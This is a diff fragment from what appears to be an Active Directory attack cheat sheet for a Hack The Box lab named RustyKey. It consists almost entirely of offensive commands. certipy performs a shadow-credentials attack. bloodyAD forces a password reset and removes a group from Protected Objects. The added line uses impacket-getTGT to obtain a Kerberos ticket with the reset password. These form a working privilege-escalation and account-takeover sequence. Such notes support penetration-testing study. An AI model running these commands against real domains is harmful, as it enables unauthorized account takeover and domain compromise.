@@ -699,6 +699,7 @@ certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
 
 +---------- ForceChangePassword ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
+impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme
 
 +---------- Remove Protected ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
